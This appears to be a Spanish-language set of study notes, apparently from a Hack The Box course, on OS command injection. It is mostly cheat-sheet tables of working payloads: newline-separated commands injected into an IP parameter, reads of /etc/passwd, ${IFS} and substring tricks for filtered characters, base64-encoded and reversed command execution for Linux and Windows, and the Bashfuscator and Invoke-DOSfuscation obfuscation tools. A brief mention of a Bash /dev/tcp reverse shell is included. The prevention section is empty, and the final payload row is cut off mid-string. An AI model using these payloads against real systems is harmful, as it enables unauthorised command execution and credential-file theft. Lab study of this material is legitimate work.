Más información potente en [payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)

## Operadores de inyección de comandos
### Operadores de inyección en general

| **Injection Type**                      | **Operators**                                     |
| --------------------------------------- | ------------------------------------------------- |
| SQL Injection                           | `'` `,` `;` `--` `/* */`                          |
| Command Injection                       | `;` `&&`                                          |
| LDAP Injection                          | `*` `(` `)` `&` `\|`                              |
| XPath Injection                         | `'` `or` `and` `not` `substring` `concat` `count` |
| OS Command Injection                    | `;` `&` `\|`                                      |
| Code Injection                          | `'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^`  |
| Directory Traversal/File Path Traversal | `../` `..\\` `%00`                                |
| Object Injection                        | `;` `&` `\|`                                      |
| XQuery Injection                        | `'` `;` `--` `/* */`                              |
| Shellcode Injection                     | `\x` `\u` `%u` `%n`                               |
| Header Injection                        | `\n` `\r\n` `\t` `%0d` `%0a` `%09`                |
### Operadores de command Injection

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |
| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------ |
| Semicolon              | `;`                     | `%3b`                     | Both                                       |
| New Line               | `\n`                    | `%0a`                     | Both                                       |
| Background             | `&`                     | `%26`                     | Both (second output generally shown first) |
| Pipe                   | `\|`                    | `%7c`                     | Both (only second output is shown)         |
| AND                    | `&&`                    | `%26%26`                  | Both (only if first succeeds)              |
| OR                     | `\|`                    | `%7c%7c`                  | Second (only if first fails)               |
| Sub-Shell              | ` `` `                  | `%60%60`                  | Both **(Linux-only)**                      |
| Sub-Shell              | `$()`                   | `%24%28%29`               | Both **(Linux-only)**                      |
|                        |                         |                           |                                            |
### Chuleta de operadores y construcciones útiles
| Operador / construcción | Para qué sirve                                      |                            ¿Necesita Bash? | ¿Suele sobrevivir a filtros?      | Ejemplo en Burp                                           |
| ----------------------- | --------------------------------------------------- | -----------------------------------------: | --------------------------------- | --------------------------------------------------------- |
| `%0a`                   | separar comandos con salto de línea                 |                                         No | Sí, bastante                      | `ip=127.0.0.1%0awhoami`                                   |
| `;`                     | ejecutar otro comando siempre                       |                                         No | No mucho, suele filtrarse pronto  | `ip=127.0.0.1;whoami`                                     |
| `&&`                    | ejecutar solo si el primero tuvo éxito              |                                         No | Media                             | `ip=127.0.0.1&&id`                                        |
| `\|`                    | ejecutar solo si el primero falla                   |                                         No | Media                             | `ip=127.0.0.1\|id`                                        |
| `&`                     | background / separación rara                        |                                         No | Media                             | `ip=127.0.0.1&id`                                         |
| `\|`                    | pipe real stdout → stdin                            |                                         No | Baja, muy filtrado                | `ip=127.0.0.1\|wc -c`                                     |
| `>`                     | redirigir stdout a fichero                          |                                         No | Baja-media                        | `ip=127.0.0.1%0aid>/tmp/x`                                |
| `>>`                    | append a fichero                                    |                                         No | Baja-media                        | `ip=127.0.0.1%0aid>>/tmp/x`                               |
| `<`                     | stdin desde fichero                                 |                                         No | Baja-media                        | `ip=127.0.0.1%0awc -l</etc/passwd`                        |
| `2>/dev/null`           | ocultar errores                                     |                                         No | Media                             | `ip=127.0.0.1%0afind / -name flag 2>/dev/null`            |
| `2>&1`                  | juntar stderr y stdout                              |                                         No | Baja-media                        | `ip=127.0.0.1%0acmd 2>&1`                                 |
| `<<<`                   | here-string, meter texto por stdin                  |                                         Sí | Media, pero depende de shell real | `ip=127.0.0.1%0axxd -r -p<<<414243`                       |
| `<<EOF`                 | here-doc, bloque multilínea                         |                                 Sí/depende | Baja en web                       | más útil en shell que en Burp                             |
| `` `...` ``             | command substitution old-school                     |                                         No | Media-alta, muy usada en labs     | `ip=127.0.0.1%0a\`id``                                    |
| `$(...)`                | command substitution moderna                        |                                         No | Media                             | `ip=127.0.0.1%0a$(whoami)`                                |
| `${IFS}`                | sustituir espacio                                   |                                         No | Alta                              | `ip=127.0.0.1%0acat${IFS}/etc/passwd`                     |
| `${VAR}`                | expandir variable                                   |                                         No | Alta                              | `ip=127.0.0.1%0aecho${IFS}${PATH}`                        |
| `${VAR:3:1}`            | sacar substring, útil para `-`, `/`, letras         |                       Sí, normalmente Bash | Media                             | `ip=127.0.0.1%0aid${IFS}${APACHE_RUN_GROUP:3:1}u`         |
| `${var//pat/repl}`      | reemplazo global / reconstrucción                   |                       Sí, normalmente Bash | Media                             | `ip=...%0aecho${IFS}${g//xx/}`                            |
| `{a,b}`                 | brace expansion, construir comando+args sin espacio |                                   Sí, Bash | Media                             | `ip=127.0.0.1%0a{echo,hola}`                              |
| `{1..5}`                | rango / expansión                                   |                                   Sí, Bash | Media                             | `ip=...%0aecho${IFS}{1..5}`                               |
| `(...)`                 | subshell                                            |                                         No | Media-baja                        | `ip=...%0a(cd /tmp;id)`                                   |
| `{ ...; }`              | agrupar comandos                                    |                             No/Bourne-like | Baja-media                        | `ip=...%0a{ id; whoami; }`                                |
| `<(...)`                | process substitution                                |                               Sí, Bash/Zsh | Baja                              | `grep root <(find /usr/share/)`                           |
| `>(...)`                | process substitution salida                         |                               Sí, Bash/Zsh | Baja                              | `echo hola > >(wc -c)`                                    |
| `$((...))`              | aritmética                                          |                                         No | Media                             | `ip=...%0aecho${IFS}$((2+2))`                             |
| `'\''`                  | meter `'` dentro de comillas simples                |                                         No | Media                             | útil en `bash -c '...'\''...'`                            |
| `b'a'sh` / `g'r'ep`     | romper firmas de palabras clave                     |                                         No | Alta                              | `ip=...%0ab'a'sh${IFS}${APACHE_RUN_GROUP:3:1}c${IFS}"id"` |
| `tr '!-}' '"-~'<<<X`    | generar carácter “siguiente” ASCII                  |                              Sí, por `<<<` | Media                             | `ip=...%0aecho${IFS}$(tr '!-}' '"-~'<<<{)`                |
| `xxd -r -p<<<HEX`       | reconstruir comandos/strings desde hex              | `<<<` pide Bash; `xxd` depende del binario | Media                             | `ip=...%0a$(xxd -r -p<<<6964)`                            |
| `bash -c "..."`         | reparsear una cadena como shell real                |                                         Sí | Media                             | `ip=...%0abash${IFS}${APACHE_RUN_GROUP:3:1}c${IFS}"id"`   |
| `sh -c "..."`           | reparsear con shell más básica                      |                                         No | Media                             | `ip=...%0ash${IFS}${APACHE_RUN_GROUP:3:1}c${IFS}"id"`     |
| `eval`                  | reparsear texto como código shell                   |                                 Sí/depende | Baja, muy vigilado                | `ip=...%0aeval${IFS}"id"`                                 |
| `--`                    | fin de opciones                                     |                                         No | Alta                              | `grep -- -root file`                                      |
| glob `*`                | wildcard / evitar strings exactas                   |                                         No | Alta                              | `cat /et*/pass*`                                          |
| glob `?`                | un carácter comodín                                 |                                         No | Alta                              | `ls /et?/passw?d`                                         |
| `[abc]`                 | clase de caracteres                                 |                                         No | Alta                              | `ls /et[c]/passwd`                                        |
| `/dev/tcp/H/P`          | sockets TCP en Bash                                 |                                         Sí | Baja-media                        | reverse shell Bash                                        |

### Herramientas útiles
#### [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator) - Linux
Herramienta, que si ejecutamos sin ninguna instrucción adicional (p.ej: )
```bash
opt/Bashfuscator/bashfuscator/bin  ./bashfuscator -c 'cat /etc/passwd'
```
nos genera un payload aleatorio, aunque muchas veces muy complejo. Un ejemplo de payload menos aleatorio puede ser el siguiente

- `-s 1`: fija la preferencia de **size** al mínimo.
- `-t 1`: fija la preferencia de **time** al mínimo. Intenta usar mutators con menos sobrecoste de ejecución.
- `--no-mangling`: desactiva el **mangling**, que es la capa adicional que reordena o altera líneas del payload final.
- `--layers 1`: aplica **1 sola capa** de ofuscación. Por defecto son dos
#### [Dosfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation) - Windows
Script en powershell
```powershell
PS C:\htb> git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git PS C:\htb> cd Invoke-DOSfuscation PS C:\htb> Import-Module .\Invoke-DOSfuscation.psd1 PS C:\htb> Invoke-DOSfuscation Invoke-DOSfuscation> help
```
### Prevención
- Utilizar en php la función
## Chuleta htb
### Linux
#### Filtered Character Bypass

| Code                    | Description                                                                        |
| ----------------------- | ---------------------------------------------------------------------------------- |
| `printenv`              | Can be used to view all environment variables                                      |
| **Spaces**              |                                                                                    |
| `%09`                   | Using tabs instead of spaces                                                       |
| `${IFS}`                | Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. `$()`) |
| `{ls,-la}`              | Commas will be replaced with spaces                                                |
| **Other Characters**    |                                                                                    |
| `${PATH:0:1}`           | Will be replaced with `/`                                                          |
| `${LS_COLORS:10:1}`     | Will be replaced with `;`                                                          |
| `$(tr '!-}' '"-~'<<<[)` | Shift character by one (`[` -> `\`)                                                |



#### Blacklisted Command Bypass

| Code                                                         | Description                         |
| ------------------------------------------------------------ | ----------------------------------- |
| **Character Insertion**                                      |                                     |
| `'` or `"`                                                   | Total must be even                  |
| `$@` or `\`                                                  | Linux only                          |
| **Case Manipulation**                                        |                                     |
| `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`                           | Execute command regardless of cases |
| `$(a="WhOaMi";printf %s "${a,,}")`                           | Another variation of the technique  |
| **Reversed Commands**                                        |                                     |
| `echo 'whoami' \| rev`                                       | Reverse a string                    |
| `$(rev<<<'imaohw')`                                          | Execute reversed command            |
| **Encoded Commands**                                         |                                     |
| `echo -n 'cat /etc/passwd \| grep 33' \| base64`             | Encode a string with base64         |
| `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)` | Execute b64 encoded string          |

---

### Windows

#### Filtered Character Bypass

|Code|Description|
|---|---|
|`Get-ChildItem Env:`|Can be used to view all environment variables - (PowerShell)|
|**Spaces**||
|`%09`|Using tabs instead of spaces|
|`%PROGRAMFILES:~10,-5%`|Will be replaced with a space - (CMD)|
|`$env:PROGRAMFILES[10]`|Will be replaced with a space - (PowerShell)|
|**Other Characters**||
|`%HOMEPATH:~0,-17%`|Will be replaced with `\` - (CMD)|
|`$env:HOMEPATH[0]`|Will be replaced with `\` - (PowerShell)|

#### Blacklisted Command Bypass

| Code                                                                                            | Description                              |
| ----------------------------------------------------------------------------------------------- | ---------------------------------------- |
| **Character Insertion**                                                                         |                                          |
| `'` or `"`                                                                                      | Total must be even                       |
| `^`                                                                                             | Windows only (CMD)                       |
| **Case Manipulation**                                                                           |                                          |
| `WhoAmi`                                                                                        | Simply send the character with odd cases |
| **Reversed Commands**                                                                           |                                          |
| `"whoami"[-1..-20] -join ''`                                                                    | Reverse a string                         |
| `iex "$('imaohw'[-1..-20] -join '')"`                                                           | Execute reversed command                 |
| **Encoded Commands**                                                                            |                                          |
| `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))`                 | Encode a string with base64              |
| `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8A` |                                          |
## Ejemplo ejercicio
